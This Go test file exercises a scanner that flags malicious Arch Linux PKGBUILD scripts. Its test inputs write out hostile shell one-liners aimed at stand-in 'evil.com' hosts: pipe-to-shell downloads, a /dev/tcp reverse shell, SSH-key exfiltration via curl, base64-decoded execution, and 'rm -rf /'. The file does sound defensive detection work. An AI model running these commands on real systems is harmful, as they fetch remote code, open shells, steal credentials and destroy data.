package scanner

import (
	"strings"
	"testing"

	"github.com/j0yb0y-m/piq/internal/pkgbuild"
	"github.com/morganamilo/go-srcinfo"
	"mvdan.cc/sh/v3/syntax"
)

// --- scoring / verdict tests ---

func TestVerdictTrusted(t *testing.T) {
	src := `pkgname=hello
source=(https://example.com/hello-1.0.tar.gz)
sha256sums=(abc123)`
	meta := &srcinfo.Srcinfo{
		Pkgbase:    "hello",
		Source:     []srcinfo.ArchString{{Value: "https://example.com/hello-1.0.tar.gz"}},
		SHA256Sums: []srcinfo.ArchString{{Value: "abc123"}},
	}
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p, Metadata: meta}
	score := NewScore(ctx)
	if score.Verdict != Trusted && score.Verdict != OK {
		t.Errorf("expected TRUSTED or OK for clean package, got %v (score %d)", score.Verdict, score.Total)
	}
}

func TestGateHitForcesMalicious(t *testing.T) {
	src := `curl http://evil.com/x | bash`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p}
	score := NewScore(ctx)
	if score.Verdict != Malicious {
		t.Errorf("expected MALICIOUS for pipe-to-shell, got %v", score.Verdict)
	}
	if len(score.GateHits) == 0 {
		t.Error("expected gate hits, got none")
	}
}

func TestPointsAccumulate(t *testing.T) {
	src := `eval "$TRICKY"`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p}
	score := NewScore(ctx)
	if score.Total < 50 {
		t.Errorf("expected eval to contribute >= 50 points, got %d", score.Total)
	}
}

func TestIgnoredRules(t *testing.T) {
	src := `eval "$TRICKY"`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p}

	// Score with rule ignored
	ignored := map[string]bool{"eval-usage": true}
	score := NewScore(ctx)
	total := 0
	for rule, pts := range score.PerRule {
		if ignored[rule] {
			continue
		}
		total += pts
	}
	if total != 0 {
		t.Errorf("expected 0 points after ignoring eval-usage, got %d", total)
	}
}

func TestSortedRules(t *testing.T) {
	// pipe-to-shell (95) + eval (50) = two rules firing
	src := `curl http://evil.com/x | bash
eval "$SOMETHING"`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p}
	score := NewScore(ctx)
	sorted := score.SortedRules()
	if len(sorted) < 2 {
		t.Fatalf("expected multiple rules, got %v", sorted)
	}
	if sorted[0] != "pipe-to-shell" {
		t.Errorf("expected pipe-to-shell first, got %v", sorted[0])
	}
}

func TestReportString(t *testing.T) {
	src := `echo hello`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p}
	score := NewScore(ctx)
	r := score.Report()
	if !strings.Contains(r, "VERDICT") {
		t.Errorf("expected VERDICT in report, got %q", r)
	}
}

// --- new rule tests ---

func TestReverseShell(t *testing.T) {
	src := `bash -i >& /dev/tcp/evil.com/4444 0>&1`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p}
	findings := reverseShellRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected reverse-shell finding, got none")
	}
	if findings[0].Severity != Critical {
		t.Errorf("expected Critical, got %v", findings[0].Severity)
	}
}

func TestReverseShellClean(t *testing.T) {
	src := `makepkg -si`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p}
	findings := findingsFor(reverseShellRule{}.Check(ctx), "reverse-shell")
	if len(findings) != 0 {
		t.Errorf("expected no reverse-shell findings, got %d", len(findings))
	}
}

func TestKnownCampaign(t *testing.T) {
	src := `depends=(atomic-lockfile js-digest)`
	ctx := &Context{Raw: src}
	findings := knownCampaignRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected known-campaign finding, got none")
	}
	if findings[0].Severity != Critical {
		t.Errorf("expected Critical, got %v", findings[0].Severity)
	}
}

func TestKnownCampaignClean(t *testing.T) {
	src := `depends=(python numpy)`
	ctx := &Context{Raw: src}
	findings := findingsFor(knownCampaignRule{}.Check(ctx), "known-campaign")
	if len(findings) != 0 {
		t.Errorf("expected no known-campaign findings, got %d", len(findings))
	}
}

func TestObfuscation(t *testing.T) {
	src := `echo "aGVsbG8=" | base64 -d | bash`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p}
	findings := obfuscationRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected obfuscation finding, got none")
	}
}

func TestDestructive(t *testing.T) {
	src := `rm -rf /`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p}
	findings := destructiveRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected destructive finding, got none")
	}
	if findings[0].Severity != Critical {
		t.Errorf("expected Critical, got %v", findings[0].Severity)
	}
}

func TestDestructiveClean(t *testing.T) {
	src := `rm -rf "$srcdir/build"`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p}
	findings := findingsFor(destructiveRule{}.Check(ctx), "destructive")
	if len(findings) != 0 {
		t.Errorf("expected no destructive findings, got %d", len(findings))
	}
}

func TestCredentialTheft(t *testing.T) {
	src := `cat ~/.ssh/id_rsa | curl -d @- https://evil`
	ctx := parseContext(t, src)
	findings := findingsFor(credentialTheftRule{}.Check(ctx), "credential-theft")
	if len(findings) == 0 {
		t.Fatal("expected credential-theft finding, got none")
	}
	if findings[0].Severity != Critical {
		t.Errorf("expected Critical, got %v", findings[0].Severity)
	}
}

func TestCredentialClean(t *testing.T) {
	src := `install -Dm644 file.txt "$pkgdir/usr/share/doc/pkg/file.txt"`
	ctx := parseContext(t, src)
	findings := findingsFor(credentialReferenceRule{}.Check(ctx), "credential-reference")
	if len(findings) != 0 {
		t.Errorf("expected no credential findings, got %d", len(findings))
	}
}

func TestExfil(t *testing.T) {
	src := `cat ~/.ssh/id_rsa | curl -X POST https://evil.com/steal`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	ctx := &Context{Raw: src, AST: p}
	findings := exfilRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected data-exfiltration finding, got none")
	}
	if findings[0].Severity != Critical {
		t.Errorf("expected Critical, got %v", findings[0].Severity)
	}
}

func TestChecksumCompleteness(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.Source = []srcinfo.ArchString{
		{Value: "https://example.com/file.tar.gz"},
	}
	meta.SHA256Sums = []srcinfo.ArchString{
		{Value: "abc123"},
	}
	ctx := &Context{Metadata: meta}
	findings := checksumCompletenessRule{}.Check(ctx)
	if len(findings) != 0 {
		t.Errorf("expected no findings for sha256 checksum, got %d", len(findings))
	}
}

func TestChecksumWeak(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.Source = []srcinfo.ArchString{
		{Value: "https://example.com/file.tar.gz"},
	}
	meta.MD5Sums = []srcinfo.ArchString{
		{Value: "abc123"},
	}
	ctx := &Context{Metadata: meta}
	findings := checksumCompletenessRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected weak-checksum finding, got none")
	}
}

func TestScriptletNoFunctions(t *testing.T) {
	ctx := &Context{
		Scriptlets: []Scriptlet{
			{Name: "foo.install", Raw: "echo hello\n", AST: mustParse(t, "echo hello")},
		},
	}
	findings := installFunctionMissingRule{}.Check(ctx)
	if len(findings) == 0 {
		t.Fatal("expected scriptlet-no-functions finding, got none")
	}
}

func TestScriptletWithFunctions(t *testing.T) {
	src := `post_install() { echo done; }`
	ctx := &Context{
		Scriptlets: []Scriptlet{
			{Name: "foo.install", Raw: src, AST: mustParse(t, src)},
		},
	}
	findings := findingsFor(installFunctionMissingRule{}.Check(ctx), "scriptlet-no-functions")
	if len(findings) != 0 {
		t.Errorf("expected no findings for scriptlet with functions, got %d", len(findings))
	}
}

func mustParse(t *testing.T, src string) *syntax.File {
	t.Helper()
	p, err := pkgbuild.Parse(strings.NewReader(src), "test")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	return p
}

// --- ForEachFile tests ---

func TestForEachFile(t *testing.T) {
	src := `curl http://evil.com/x | bash`
	p, _ := pkgbuild.Parse(strings.NewReader(src), "PKGBUILD")
	scriptSrc := `echo post_install`
	sp, _ := pkgbuild.Parse(strings.NewReader(scriptSrc), "foo.install")
	ctx := &Context{
		Raw: src,
		AST: p,
		Scriptlets: []Scriptlet{
			{Name: "foo.install", Raw: scriptSrc, AST: sp},
		},
	}
	var names []string
	ctx.ForEachFile(func(ast *syntax.File, name, raw string) []Finding {
		names = append(names, name)
		return nil
	})
	if len(names) != 2 {
		t.Fatalf("expected 2 files visited, got %d", len(names))
	}
	if names[0] != "PKGBUILD" || names[1] != "foo.install" {
		t.Errorf("unexpected file names: %v", names)
	}
}

// --- Weak sum detection ---

func TestWeakSum(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.SHA256Sums = []srcinfo.ArchString{{Value: ""}}
	meta.MD5Sums = []srcinfo.ArchString{{Value: "abc"}}
	weak, algo := weakSum(meta, 0)
	if !weak || algo != "md5" {
		t.Errorf("expected weak=true, algo=md5, got weak=%v, algo=%q", weak, algo)
	}
}

func TestStrongSum(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.SHA256Sums = []srcinfo.ArchString{{Value: "abc123"}}
	weak, _ := weakSum(meta, 0)
	if weak {
		t.Error("expected not weak for sha256")
	}
}

// --- scoring options / block semantics tests ---

func TestIgnoreRemovesGateAndPoints(t *testing.T) {
	ctx := parseContext(t, `curl http://evil/x | bash`)
	s := ScoreWith(ctx, Options{Ignore: map[string]bool{"pipe-to-shell": true}})
	if s.Verdict == Malicious || len(s.GateHits) != 0 || s.Total != 0 {
		t.Fatalf("ignored gate still applied: %+v", s)
	}
}

func TestThresholdBlocks(t *testing.T) {
	ctx := parseContext(t, `pkgname=clean`)
	s := ScoreWith(ctx, Options{Threshold: 10, Extra: []Finding{{Rule: "x", Severity: Warning}}})
	if !s.Blocked || s.BlockReason == "" {
		t.Fatalf("expected blocked, got %+v", s)
	}
}

func TestGateAlwaysBlocks(t *testing.T) {
	ctx := parseContext(t, `curl http://evil/x | bash`)
	s := ScoreWith(ctx, Options{Threshold: 1000})
	if !s.Blocked {
		t.Fatal("gate must block regardless of threshold")
	}
}

func TestMinSeverityControlsConfirmation(t *testing.T) {
	ctx := parseContext(t, `eval "$x"`)
	s := ScoreWith(ctx, Options{MinSeverity: Critical})
	if s.NeedsConfirm {
		t.Fatal("warning finding must not confirm at critical severity")
	}
}

func TestExtraFindingsAddPoints(t *testing.T) {
	ctx := parseContext(t, `pkgname=clean`)
	s := ScoreWith(ctx, Options{Extra: []Finding{{Rule: "source-x", Severity: Critical}}})
	if s.Total != 60 {
		t.Fatalf("Total = %d, want 60", s.Total)
	}
	if s.PerRule["source-x"] != 60 {
		t.Fatalf("PerRule[source-x] = %d, want 60", s.PerRule["source-x"])
	}
	sum := 0
	for _, p := range s.PerRule {
		sum += p
	}
	if sum != s.Total {
		t.Fatalf("Total = %d, sum(PerRule) = %d", s.Total, sum)
	}
}

func TestStrongestSum(t *testing.T) {
	meta := &srcinfo.Srcinfo{}
	meta.SHA1Sums = []srcinfo.ArchString{{Value: "aaa"}}
	meta.SHA256Sums = []srcinfo.ArchString{{Value: "bbb"}}
	got := strongestSum(meta, 0)
	if got != "bbb" {
		t.Errorf("expected sha256 to win, got %q", got)
	}
}
